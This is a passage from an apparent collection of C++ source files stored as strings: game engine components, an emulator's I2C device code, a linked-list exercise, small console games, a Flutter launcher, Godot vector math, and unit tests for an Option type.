EventData.DeactivationEvent == Event)\n\t{\n\t\tDeactivateByEvent();\n\t}\n\tif(Event == *EventManagerLabels::ResetEventPrefix)\n\t{\n\t\tResetEventCalled();\n\t}\n\tOnReceivedEventProcessed(Event);\n}\n\nvoid UEventListenerComponent::OnReceivedEventProcessed(FName Event)\n{\n\tK2_OnReceivedEventProcessed(Event);\n}\n\nvoid UEventListenerComponent::ActivateByEvent()\n{\n\tif(Activated) return;\n\tActivated = true;\n\tK2_OnActivateByEvent();\n}\n\nvoid UEventListenerComponent::DeactivateByEvent()\n{\n\tK2_OnDeactivateByEvent();\n}\n\nvoid UEventListenerComponent::ResetEventCalled()\n{\n\tif(DeniedReset || DefaultEventData.ActivationByEvent) return;\n\n\tEventData = DefaultEventData;\n\t// TODO : Should be false straight\n\tActivated = Activated && DeniedReset;\n\tK2_OnResetEventCalled();\n\tDeactivateByEvent();\n}\n\n\n// Called every frame\nvoid UEventListenerComponent::TickComponent(float DeltaTime, ELevelTick TickType, FActorComponentTickFunction* ThisTickFunction)\n{\n\tSuper::TickComponent(DeltaTime, TickType, ThisTickFunction);\n\n\t// ...\n}\n\nvoid UEventListenerComponent::CallEvent(FName Event)\n{\n\tif(Event == NAME_None) return;\n\tif(UEventManagerSubsystem* EventManager = GetWorld()->GetSubsystem<UEventManagerSubsystem>())\n\t{\n\t\tEventManager->CallEvent(Event);\n\t}\n}\n\n",
    "/*\n    Copyright 2024 Hydr8gon\n\n    This file is part of GamePawd.\n\n    GamePawd is free software: you can redistribute it and/or modify it\n    under the terms of the GNU General Public License as published by\n    the Free Software Foundation, either version 3 of the License, or\n    (at your option) any later version.\n\n    GamePawd is distributed in the hope that it will be useful, but\n    WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n    General Public License for more details.\n\n    You should have received a copy of the GNU General Public License\n    along with GamePawd. If not, see <https://www.gnu.org/licenses/>.\n*/\n\n#include <cstdio>\n#include <cstring>\n\n#include \"i2c.h\"\n#include \"interrupts.h\"\n\nnamespace I2c {\n    uint32_t controls[4];\n    uint32_t statuses[4];\n    uint32_t irqEnable;\n    uint32_t irqFlags;\n\n    uint32_t dataCount;\n    uint8_t deviceId;\n    uint8_t command;\n\n    void updateTransfer(int i);\n}\n\nvoid I2c::reset() {\n    // Reset the registers\n    memset(controls, 0, sizeof(controls));\n    memset(statuses, 0, sizeof(statuses));\n    irqFlags = 0;\n    irqEnable = 0;\n\n    // Reset the device state\n    dataCount = 0;\n    deviceId = 0;\n    command = 0;\n}\n\nvoid I2c::updateTransfer(int i) {\n    // Indicate that a transfer has completed if started\n    if (~statuses[i] & 0x2) return;\n    statuses[i] |= 0x4; // Acknowledge\n    controls[i] &= ~0x20; // Data ready\n\n    // Request an I2C interrupt if enabled\n    if (~irqEnable & (2 << i)) return;\n    irqFlags |= (2 << i);\n    Interrupts::requestIrq(15);\n}\n\nuint32_t I2c::readIrqFlags() {\n    // Read from the I2C interrupt flag register\n    return irqFlags;\n}\n\nuint32_t I2c::readIrqEnable() {\n    // Read from the I2C interrupt enable register\n    return irqEnable;\n}\n\nuint32_t I2c::readData(int i) {\n    // Update transfer state for the next byte\n    updateTransfer(i);\n    dataCount++;\n\n    // Handle the current command for the selected device\n    switch (uint8_t id = deviceId >> 1) {\n    case 0x18: // Amplifier\n        switch (command) {\n            case 0x30: return 0x20; // Stub\n\n        default:\n            // Handle unknown commands by doing nothing\n            printf(\"Unimplemented amplifier read with command 0x%X\\n\", command);\n            return 0x00;\n        }\n\n    case 0x21: // Camera\n        switch (command) {\n            case 0x0A: return 0x77; // Product ID A\n            case 0x0B: return 0x42; // Product ID B\n            case 0x11: return 0x01; // Clock divider\n            case 0x9C: return 0x1D; // Gamma Y-coord A\n            case 0x9D: return 0x2E; // Gamma Y-coord B\n\n        default:\n            // Handle unknown commands by doing nothing\n            printf(\"Unimplemented camera read with command 0x%X\\n\", command);\n            return 0x00;\n        }\n\n    case 0x39: // LCD\n        switch (command) {\n        case 0xBF: // Read ID\n            // Return the ID of a Panasonic LCD\n            return (dataCount == 4) ? 0x02 : 0x00;\n\n        default:\n            // Handle unknown commands by doing nothing\n            printf(\"Unimplemented LCD read with command 0x%X\\n\", command);\n            return 0x00;\n        }\n\n    default:\n        // Handle unknown devices by doing nothing\n        printf(\"Unimplemented I2C read with device ID 0x%X\\n\", id);\n        return 0x00;\n    }\n}\n\nuint32_t I2c::readControl(int i) {\n    // Read from one of the I2C control registers\n    return controls[i];\n}\n\nuint32_t I2c::readStatus(int i) {\n    // Read from one of the I2C status registers\n    return statuses[i];\n}\n\nvoid I2c::writeIrqEnable(uint32_t mask, uint32_t value) {\n    // Write to the I2C interrupt enable register\n    irqEnable = (irqEnable & ~mask) | (value & mask);\n}\n\nvoid I2c::writeIrqAck(uint32_t mask, uint32_t value) {\n    // Acknowledge I2C interrupt flags by clearing them\n    irqFlags &= ~(value & mask);\n}\n\nvoid I2c::writeData(int i, uint32_t mask, uint32_t value) {\n    // Update transfer state for the next byte\n    updateTransfer(i);\n    dataCount++;\n\n    // Set the device ID or command depending on write count\n    if (dataCount == 1)\n        deviceId = value & mask;\n    else if (dataCount == 2)\n        command = value & mask;\n}\n\nvoid I2c::writeControl(int i, uint32_t mask, uint32_t value) {\n    // Write to one of the I2C control registers, with stop masked out\n    controls[i] = (controls[i] & ~mask) | (value & ~0x1 & mask);\n\n    // Forward some bits to the unit's status register\n    mask &= 0xF;\n    statuses[i] = (statuses[i] & ~mask) | (value & mask);\n\n    // Reset or initiate a transfer depending on state\n    if (statuses[i] & 0x1) dataCount = 0;\n    updateTransfer(i);\n}\n",
    "/**\n * Definition for singly-linked list.\n * struct ListNode {\n *     int val;\n *     ListNode *next;\n *     ListNode(int x) : val(x), next(NULL) {}\n * };\n */\n\nclass Solution {\npublic:\n    ListNode* deleteDuplicates(ListNode* head) {\n        // Create a dummy node to simplify edge cases\n        ListNode dummy(0);\n        dummy.next = head;\n        ListNode* prev = &dummy;\n\n        while (head) {\n            // Check for duplicates\n            if (head->next && head->val == head->next->val) {\n                // Skip all nodes with the same value\n                while (head->next && head->val == head->next->val) {\n                    head = head->next;\n                }\n                // Link previous non-duplicate node to the next distinct node\n                prev->next = head->next;\n            } else {\n                // Move the previous pointer only if no duplicates\n                prev = prev->next;\n            }\n            head = head->next; // Move to the next node\n        }\n        return dummy.next; // Return the modified list\n    }\n};\n\n// Example usage:\n// ListNode* head = ...; // Construct the linked list\n// Solution sol;\n// ListNode* result = sol.deleteDuplicates(head); // result will contain the modified list\n",
    "\ufeff#include <iostream>\n#include <Windows.h> // \u041e\u043a\u0440\u0430\u0448\u0438\u0432\u0430\u043d\u0438\u0435 \u043a\u043e\u043d\u0441\u043e\u043b\u0438 \u0438 \u0440\u0430\u0431\u043e\u0442\u0430 \u0441 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u0430\u043c\u0438\n#include <conio.h>\n#include <string>\n#include <thread>\n#include <chrono>\n#include \"tabulate.hpp\"\nusing namespace std;\nusing namespace tabulate;\nusing Row_t = Table::Row_t;\n\n// enumeration - \u043f\u0435\u0440\u0435\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u0435\n// \u041d\u0430\u043f\u0440\u0438\u043c\u0435\u0440, \u0447\u0442\u043e\u0431\u044b \u043d\u0435 \u0437\u0430\u043f\u043e\u043c\u0438\u043d\u0430\u0442\u044c \u043a\u043e\u0434\u044b \u043a\u043b\u0430\u0432\u0438\u0448\nenum KeyCodes { ENTER = 13, ESCAPE = 27, LEFT = 75, RIGHT = 77, UP = 72, DOWN = 80, SPACEBAR = 32 };\nenum Colors { DARKBLUE = 1, DARKGREEN = 2, LIGHTBLUE = 3, ACCENTRED = 4, PURPLE  = 5, ACCENTYELLOW = 6, LIGHTWHITE = 7, GRAY = 8, GREEN = 10, CYAN = 11, ACCENTPURPLE = 13, WHITE = 15, RED = 12, YELLOW = 14, BLUE = 9 };\nenum Objects { HALL = 0, WALL = 1, COIN = 2, ENEMY = 3, MEDKIT = 4 };\n// enum Objects {HALL, WALL, COIN, ENEMY}; // \u0417\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u043f\u043e \u0443\u043c\u043e\u043b\u0447\u0430\u043d\u0438\u044e, \u043a\u0430\u0436\u0434\u044b\u0439 \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0438\u0439 \u043d\u0430 1 \u0431\u043e\u043b\u044c\u0448\u0435\n\n\n// Prototypes\n\n\nbool CoordCompletionCheck(int y, int x, int point_x, int point_y);\nvoid ascii_table();\nvoid level_generation(int HEIGHT, int WIDTH, int** location);\nvoid erase_from_position(HANDLE h, COORD position, int color);\nvoid print_to_position(HANDLE h, COORD position, int color);\nvoid charachter_placement(HANDLE h, COORD position, int color);\nvoid cursor_placement_print(HANDLE h, COORD position, int color, string text);\nvoid cursor_placement_print(HANDLE h, COORD position, int color, int text);\nvoid cursor_placement_print(HANDLE h, COORD position, int color, double text);\nvoid presentation (HANDLE h, int height, int width, int** location);\nvoid print_win_statistics(HANDLE h, short health, int coins);\nvoid print_no_health_statistics(HANDLE h, short health, int coins);\nvoid color_table(HANDLE h);\nbool check_range(const int& value, int min, int max);\nint print_menu(HANDLE h);\nint print_menu_test(HANDLE h);\nvoid mirrored_difficulty(HANDLE h, const int width, const int height);\nvoid increase_2d_empty_array_size(int**& array_ptr, const int& new_width, const int& new_height);\nvoid updateTimeInWindowTitle();\nint main();\n\n\n// \u0421\u0435\u043a\u0446\u0438\u044f \u0441 \u0444\u0443\u043d\u043a\u0446\u0438\u044f\u043c\u0438 / Functions\n\n\nbool CoordCompletionCheck(int y, int x, int point_x, int point_y) { // 49 13\n    if (x == point_x && y == point_y) {\n        return 1;\n    }\n    return 0;\n}\n\n\nvoid ascii_table() { // Table for printing out ASCII symbols\n    for (int code = 0; code < 256; code++)\n    {\n        cout << code << \" - \" << (char)code << \"\\n\";\n    }\n}\n\n\nvoid level_generation(int height, int width, int** location) {\n\n    // \u041c\u043e\u0434\u0435\u043b\u044c \u043b\u043e\u043a\u0430\u0446\u0438\u0438 - \u0447\u0438\u0441\u043b\u0430 \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u043e\u0442\u0432\u0435\u0447\u0430\u044e\u0442 \u0437\u0430 \u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0451\u043d\u043d\u044b\u0435 \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u044f\n    // 0 - \u043a\u043e\u0440\u0438\u0434\u043e\u0440\u044b (\u043f\u0443\u0441\u0442\u043e\u0442\u044b)\n    // 1 - \u0441\u0442\u0435\u043d\u0430 \u0440\u0430\u0437\u0440\u0443\u0448\u0430\u0435\u043c\u0430\u044f\n    // 2 - \u041c\u043e\u043d\u0435\u0442\u043a\u0438 / \u0430\u043f\u0442\u0435\u0447\u043a\u0438 / \u0438\u0442\u0434\n    // 3 - \u0412\u0440\u0430\u0433\u0438\n\n    // \u0433\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f \u043b\u043e\u043a\u0430\u0446\u0438\u0438\n    // Location generation\n\n    for (int y = 0; y < height; y++) // \u043f\u0435\u0440\u0435\u0431\u043e\u0440 \u0441\u0442\u0440\u043e\u043a\n    {\n        for (int x = 0; x < width; x++) // \u043f\u0435\u0440\u0435\u0431\u043e\u0440 \u0441\u0442\u043e\u043b\u0431\u0446\u043e\u0432\n        {\n            /*\n            * Filling a tile with random number\n            * 0 - Halls will be printed\n            * 1 - Wall will be printed\n            * 2 - Money will be printed (For now, 100% coin will be placed)\n            * 3 - Bush will be printed (IF with custom probability of that bush being left in tile)\n            */\n            location[y][x] = rand() % 5; // 0 1 2 3 -> 0 1 2 3 4\n\n            if (x == 0 || y == 0 || x == width - 1 || y == height - 1) { // \u0421\u0442\u0435\u043d\u044b \u043f\u043e \u043a\u0440\u0430\u044f\u043c\n                location[y][x] = WALL;\n            }\n\n            if (x == 0 && y == 2 || x == width - 1 && y == height - 3) { // \u0412\u0445\u043e\u0434 \u0438 \u0432\u044b\u0445\u043e\u0434\n                location[y][x] = HALL;\n            }\n\n            if (location[y][x] == ENEMY) { // \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430, \u0435\u0441\u043b\u0438 \u043d\u0430\u0439\u0434\u0435\u043d\u0430 3 \u0442\u043e... \u043f\u043e\u043c\u0435\u043d\u044f\u0442\u044c\n                // \u041e\u043f\u0440\u0435\u0434\u0435\u043b\u044f\u0435\u0442\u0441\u044f \u0432\u0435\u0440\u043e\u044f\u0442\u043d\u043e\u0441\u0442\u044c \u0442\u043e\u0433\u043e, \u043e\u0441\u0442\u0430\u043d\u0435\u0442\u0441\u044f \u0432\u0440\u0430\u0433 \u0438\u043b\u0438 \u043d\u0435\u0442\n                // \u0414\u043e\u043f\u0443\u0441\u0442\u0438\u043c, \u0432\u0435\u0440\u043e\u044f\u0442\u043d\u043e\u0441\u0442\u044c \u043e\u0441\u0442\u0430\u0442\u044c\u0441\u044f \u043d\u0430 \u0443\u0440\u043e\u0432\u043d\u0435 - 10%\n                int prob = rand() % 10; // 0-9\n                if (prob != 0) { // 1 2 3 4 5 6 7 8 9\n                    location[y][x] = HALL;\n                }\n\n            }\n\n            \n            if (location[y][x] == MEDKIT) { // \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430, \u0435\u0441\u043b\u0438 \u043d\u0430\u0439\u0434\u0435\u043d\u0430 3 \u0442\u043e... \u043f\u043e\u043c\u0435\u043d\u044f\u0442\u044c\n                // \u041e\u043f\u0440\u0435\u0434\u0435\u043b\u044f\u0435\u0442\u0441\u044f \u0432\u0435\u0440\u043e\u044f\u0442\u043d\u043e\u0441\u0442\u044c \u0442\u043e\u0433\u043e, \u043e\u0441\u0442\u0430\u043d\u0435\u0442\u0441\u044f \u0432\u0440\u0430\u0433 \u0438\u043b\u0438 \u043d\u0435\u0442\n                // \u0414\u043e\u043f\u0443\u0441\u0442\u0438\u043c, \u0432\u0435\u0440\u043e\u044f\u0442\u043d\u043e\u0441\u0442\u044c \u043e\u0441\u0442\u0430\u0442\u044c\u0441\u044f \u043d\u0430 \u0443\u0440\u043e\u0432\u043d\u0435 - 10%\n                int prob = rand() % 15; // 0-9\n                if (prob != 0) { // 1 2 3 4 5 6 7 8 9\n                    location[y][x] = HALL;\n                }\n\n            }\n            \n\n            /*\n            * TODO: Change rand() % 4 to rand() % 5 to generate numbers 0 1 2 3 4\n            * Add here a copy of above IF with rand() % 15;\n            * This will optionally generate a number 4 with will stand for MEDKIT\n            * \n            * MEDKIT will increase players HP by 1.\n            * \n            */\n\n        }\n        // cout << \"\\n\";\n    }\n\n}\n\n\nvoid erase_from_position(HANDLE h, COORD position, int color) { // \u0421\u0442\u0438\u0440\u0430\u043d\u0438\u0435 \u0413\u0413 \u0432 \u0441\u0442\u0430\u0440\u043e\u0439 \u043f\u043e\u0437\u0438\u0446\u0438\u0438\n    SetConsoleCursorPosition(h, position);\n    SetConsoleTextAttribute(h, color);\n    cout << \" \";\n}\n\n\nvoid print_to_position(HANDLE h, COORD position, int color) { // \u041f\u043e\u043a\u0430\u0437 \u0413\u0413 \u0432 \u043d\u043e\u0432\u043e\u0439 \u043f\u043e\u0437\u0438\u0446\u0438\u0438\n    SetConsoleCursorPosition(h, position)",
    "#include \"GameMechs.h\"\n#include \"MacUILib.h\"\n\nGameMechs::GameMechs()\n{\n    // Set Default Board Size\n    boardSizeX = 30;\n    boardSizeY = 15;\n    exitFlag = false;\n    loseFlag = false;\n    cmd = 0;\n    delayConst = 5000;\n    playerCount = 0;\n\n    // Allocate 2D gameboard on the Heap - distributed method\n    gameBoard = new char*[boardSizeY];\n    for(int i = 0; i < boardSizeY; i++)\n    {\n        gameBoard[i] = new char[boardSizeX];\n    }\n\n    playerList = new Player*[4];  // up to 4 players only\n\n    // Set up the initiali game board boarders\n    setInitBoard();  \n}\n\nGameMechs::~GameMechs()\n{\n    // Deallocate the rows first\n    for(int i = 0; i < boardSizeY; i++)\n    {\n        delete[] gameBoard[i];\n    }\n\n    // Then deallocate the row lookup table.\n    delete[] gameBoard;\n\n    delete playerList;\n}\n\nvoid GameMechs::setInitBoard()  // private helper function\n{\n    for(int i = 0; i < boardSizeY; i++)\n    {\n        for(int j = 0; j < boardSizeX; j++)\n        {\n            if(i == 0 || i == (boardSizeY - 1) || j == 0 || j == (boardSizeX - 1))\n                gameBoard[i][j] = '#';\n            else\n                gameBoard[i][j] = ' ';\n        }\n    }  \n}\n\nint GameMechs::getBoardSizeX() const\n{\n    return boardSizeX;\n}\n\nint GameMechs::getBoardSizeY() const\n{\n    return boardSizeY;\n}\n\nbool GameMechs::getExitFlag() const\n{\n    return exitFlag;\n}\n\nbool GameMechs::getLoseFlag() const\n{\n    return loseFlag;\n}\n\nchar GameMechs::getCMD() const\n{\n    return cmd;\n}\n\nchar** GameMechs::getBoardRef() const\n{\n    return gameBoard;\n}\n\nPlayer** GameMechs::getPlayerListRef() const\n{\n    return playerList;\n}\n\nint GameMechs::getPlayerCount() const\n{\n    return playerCount;\n}\n\n\n\nvoid GameMechs::setExitFlag()  // private helper method\n{\n    exitFlag = true;\n}\n\nvoid GameMechs::setLoseFlag()  // private helper method\n{\n    loseFlag = true;\n}\n\nbool GameMechs::checkInput()  // private\n{\n    while(MacUILib_hasChar())\n    {        \n        cmd = MacUILib_getChar();\n        for(int i = 0; i < playerCount; i++)\n        {\n            if(playerList[i]->isMyControl(cmd))\n            {\n                playerList[i]->receiveCommand(cmd);\n                return true;\n            }\n        }\n    }\n\n    return false;\n}\n\nvoid GameMechs::processInput()\n{\n    checkInput();\n    \n    switch(cmd)\n    {\n        case 27:\n            setExitFlag();\n            break;\n\n        default:\n            break;\n    }\n}\n\nvoid GameMechs::applyDelay()\n{\n    MacUILib_Delay(delayConst);\n}\n\nvoid GameMechs::addPlayer(Player* pl)\n{\n    playerList[playerCount] = pl;\n    playerCount++;\n}\n\nvoid GameMechs::setGameLost()\n{\n    setExitFlag();\n    setLoseFlag();\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"labshared_pref\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/**************************************************************************/\n/*  vector2i.cpp                                                          */\n/**************************************************************************/\n/*                         This file is part of:                          */\n/*                             GODOT ENGINE                               */\n/*                        https://godotengine.org                         */\n/**************************************************************************/\n/* Copyright (c) 2014-present Godot Engine contributors (see AUTHORS.md). */\n/* Copyright (c) 2007-2014 Juan Linietsky, Ariel Manzur.                  */\n/*                                                                        */\n/* Permission is hereby granted, free of charge, to any person obtaining  */\n/* a copy of this software and associated documentation files (the        */\n/* \"Software\"), to deal in the Software without restriction, including    */\n/* without limitation the rights to use, copy, modify, merge, publish,    */\n/* distribute, sublicense, and/or sell copies of the Software, and to     */\n/* permit persons to whom the Software is furnished to do so, subject to  */\n/* the following conditions:                                              */\n/*                                                                        */\n/* The above copyright notice and this permission notice shall be         */\n/* included in all copies or substantial portions of the Software.        */\n/*                                                                        */\n/* THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,        */\n/* EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF     */\n/* MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. */\n/* IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY   */\n/* CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,   */\n/* TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE      */\n/* SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.                 */\n/**************************************************************************/\n\n#include <godot_cpp/variant/vector2i.hpp>\n\n#include <godot_cpp/variant/string.hpp>\n#include <godot_cpp/variant/vector2.hpp>\n\nnamespace godot {\n\nVector2i Vector2i::snapped(const Vector2i &p_step) const {\n\treturn Vector2i(\n\t\t\tMath::snapped(x, p_step.x),\n\t\t\tMath::snapped(y, p_step.y));\n}\n\nVector2i Vector2i::snappedi(int32_t p_step) const {\n\treturn Vector2i(\n\t\t\tMath::snapped(x, p_step),\n\t\t\tMath::snapped(y, p_step));\n}\n\nVector2i Vector2i::clamp(const Vector2i &p_min, const Vector2i &p_max) const {\n\treturn Vector2i(\n\t\t\tCLAMP(x, p_min.x, p_max.x),\n\t\t\tCLAMP(y, p_min.y, p_max.y));\n}\n\nVector2i Vector2i::clampi(int32_t p_min, int32_t p_max) const {\n\treturn Vector2i(\n\t\t\tCLAMP(x, p_min, p_max),\n\t\t\tCLAMP(y, p_min, p_max));\n}\n\nint64_t Vector2i::length_squared() const {\n\treturn x * (int64_t)x + y * (int64_t)y;\n}\n\ndouble Vector2i::length() const {\n\treturn Math::sqrt((double)length_squared());\n}\n\nint64_t Vector2i::distance_squared_to(const Vector2i &p_to) const {\n\treturn (p_to - *this).length_squared();\n}\n\ndouble Vector2i::distance_to(const Vector2i &p_to) const {\n\treturn (p_to - *this).length();\n}\n\nVector2i Vector2i::operator+(const Vector2i &p_v) const {\n\treturn Vector2i(x + p_v.x, y + p_v.y);\n}\n\nvoid Vector2i::operator+=(const Vector2i &p_v) {\n\tx += p_v.x;\n\ty += p_v.y;\n}\n\nVector2i Vector2i::operator-(const Vector2i &p_v) const {\n\treturn Vector2i(x - p_v.x, y - p_v.y);\n}\n\nvoid Vector2i::operator-=(const Vector2i &p_v) {\n\tx -= p_v.x;\n\ty -= p_v.y;\n}\n\nVector2i Vector2i::operator*(const Vector2i &p_v1) const {\n\treturn Vector2i(x * p_v1.x, y * p_v1.y);\n}\n\nVector2i Vector2i::operator*(const int32_t &rvalue) const {\n\treturn Vector2i(x * rvalue, y * rvalue);\n}\n\nvoid Vector2i::operator*=(const int32_t &rvalue) {\n\tx *= rvalue;\n\ty *= rvalue;\n}\n\nVector2i Vector2i::operator/(const Vector2i &p_v1) const {\n\treturn Vector2i(x / p_v1.x, y / p_v1.y);\n}\n\nVector2i Vector2i::operator/(const int32_t &rvalue) const {\n\treturn Vector2i(x / rvalue, y / rvalue);\n}\n\nvoid Vector2i::operator/=(const int32_t &rvalue) {\n\tx /= rvalue;\n\ty /= rvalue;\n}\n\nVector2i Vector2i::operator%(const Vector2i &p_v1) const {\n\treturn Vector2i(x % p_v1.x, y % p_v1.y);\n}\n\nVector2i Vector2i::operator%(const int32_t &rvalue) const {\n\treturn Vector2i(x % rvalue, y % rvalue);\n}\n\nvoid Vector2i::operator%=(const int32_t &rvalue) {\n\tx %= rvalue;\n\ty %= rvalue;\n}\n\nVector2i Vector2i::operator-() const {\n\treturn Vector2i(-x, -y);\n}\n\nbool Vector2i::operator==(const Vector2i &p_vec2) const {\n\treturn x == p_vec2.x && y == p_vec2.y;\n}\n\nbool Vector2i::operator!=(const Vector2i &p_vec2) const {\n\treturn x != p_vec2.x || y != p_vec2.y;\n}\n\nVector2i::operator String() const {\n\treturn \"(\" + itos(x) + \", \" + itos(y) + \")\";\n}\n\nVector2i::operator Vector2() const {\n\treturn Vector2((int32_t)x, (int32_t)y);\n}\n\n",
    "#include <cassert>\n#define DOCTEST_CONFIG_IMPLEMENT_WITH_MAIN\n\n#include <optional>\n\n#include \"../src/option.hpp\"\n#include \"doctest.h\"\n\nusing navp::None;\nusing navp::Option;\nusing navp::Some;\n\n// from [https://github.com/TartanLlama/optional/tree/master/tests]\nTEST_CASE(\"Triviality\") {\n  static_assert(!std::is_trivially_constructible_v<Option<int>>);\n  static_assert(std::is_trivially_copy_constructible<Option<int>>::value);\n  static_assert(std::is_trivially_copy_assignable<Option<int>>::value);\n  static_assert(std::is_trivially_move_constructible<Option<int>>::value);\n  static_assert(std::is_trivially_move_assignable<Option<int>>::value);\n  static_assert(std::is_trivially_destructible<Option<int>>::value);\n\n  {\n    struct T {\n      T(const T&) = default;\n      T(T&&) = default;\n      T& operator=(const T&) = default;\n      T& operator=(T&&) = default;\n      ~T() = default;\n    };\n    static_assert(std::is_trivially_copy_constructible<Option<T>>::value);\n    static_assert(std::is_trivially_copy_assignable<Option<T>>::value);\n    static_assert(std::is_trivially_move_constructible<Option<T>>::value);\n    static_assert(std::is_trivially_move_assignable<Option<T>>::value);\n    static_assert(std::is_trivially_destructible<Option<T>>::value);\n  }\n\n  {\n    struct T {\n      T(const T&) {}\n      T(T&&){};\n      T& operator=(const T&) { return *this; }\n      T& operator=(T&&) { return *this; };\n      ~T() {}\n    };\n    static_assert(!std::is_trivially_copy_constructible<Option<T>>::value);\n    static_assert(!std::is_trivially_copy_assignable<Option<T>>::value);\n    static_assert(!std::is_trivially_move_constructible<Option<T>>::value);\n    static_assert(!std::is_trivially_move_assignable<Option<T>>::value);\n    static_assert(!std::is_trivially_destructible<Option<T>>::value);\n  }\n}\n\nTEST_CASE(\"Size\") {\n  static_assert(sizeof(Option<double>) == 16);\n  static_assert(sizeof(std::optional<double>) == 16);\n  struct T1 {\n    double f[4];\n  };\n  static_assert(sizeof(Option<T1>) == 40);\n  static_assert(sizeof(std::optional<T1>) == 40);\n  struct ComplexT {\n    char a[7];\n    int b[3];\n    float c[6];\n    double d[9];\n    std::string e[3];\n  };\n  static_assert(sizeof(Option<ComplexT>) == sizeof(ComplexT) + alignof(ComplexT));\n  static_assert(sizeof(Option<ComplexT>) == sizeof(std::optional<ComplexT>));\n}\n\n// from [https://github.com/TartanLlama/optional/tree/master/tests]\nTEST_CASE(\"Deletion\") {\n  static_assert(std::is_copy_constructible<Option<int>>::value);\n  static_assert(std::is_copy_assignable<Option<int>>::value);\n  static_assert(std::is_move_constructible<Option<int>>::value);\n  static_assert(std::is_move_assignable<Option<int>>::value);\n  static_assert(std::is_destructible<Option<int>>::value);\n\n  {\n    struct T {\n      T(const T&) = default;\n      T(T&&) = default;\n      T& operator=(const T&) = default;\n      T& operator=(T&&) = default;\n      ~T() = default;\n    };\n    static_assert(std::is_copy_constructible<Option<T>>::value);\n    static_assert(std::is_copy_assignable<Option<T>>::value);\n    static_assert(std::is_move_constructible<Option<T>>::value);\n    static_assert(std::is_move_assignable<Option<T>>::value);\n    static_assert(std::is_destructible<Option<T>>::value);\n  }\n\n  {\n    struct T {\n      T(const T&) = delete;\n      T(T&&) = delete;\n      T& operator=(const T&) = delete;\n      T& operator=(T&&) = delete;\n    };\n    static_assert(!std::is_copy_constructible<Option<T>>::value);\n    static_assert(!std::is_copy_assignable<Option<T>>::value);\n    static_assert(!std::is_move_constructible<Option<T>>::value);\n    static_assert(!std::is_move_assignable<Option<T>>::value);\n  }\n\n  {\n    struct T {\n      T(const T&) = delete;\n      T(T&&) = default;\n      T& operator=(const T&) = delete;\n      T& operator=(T&&) = default;\n    };\n    static_assert(!std::is_copy_constructible<Option<T>>::value);\n    static_assert(!std::is_copy_assignable<Option<T>>::value);\n    static_assert(std::is_move_constructible<Option<T>>::value);\n    static_assert(std::is_move_assignable<Option<T>>::value);\n  }\n\n  {\n    struct T {\n      T(const T&) = default;\n      T(T&&) = delete;\n      T& operator=(const T&) = default;\n      T& operator=(T&&) = delete;\n    };\n    static_assert(std::is_copy_constructible<Option<T>>::value);\n    static_assert(std::is_copy_assignable<Option<T>>::value);\n  }\n}\n\n// from [https://github.com/TartanLlama/optional/tree/master/tests]\nTEST_CASE(\"Constexpr\") {\n  constexpr Option<int> o2{};\n  constexpr Option<int> o3 = {};\n  constexpr Option<int> o4 = None;\n  constexpr Option<int> o5 = {None};\n  constexpr Option<int> o6(None);\n\n  CHECK(!o2);\n  CHECK(!o3);\n  CHECK(!o4);\n  CHECK(!o5);\n  CHECK(!o6);\n}\n\n// from [https://github.com/TartanLlama/optional/tree/master/tests]\nTEST_CASE(\"Value Construct\") {\n  constexpr Option<int> o1 = 42;\n  constexpr Option<int> o2{42};\n  constexpr Option<int> o3(42);\n  constexpr Option<int> o4 = {42};\n  constexpr int i = 42;\n  constexpr Option<int> o5 = std::move(i);\n  constexpr Option<int> o6{st",
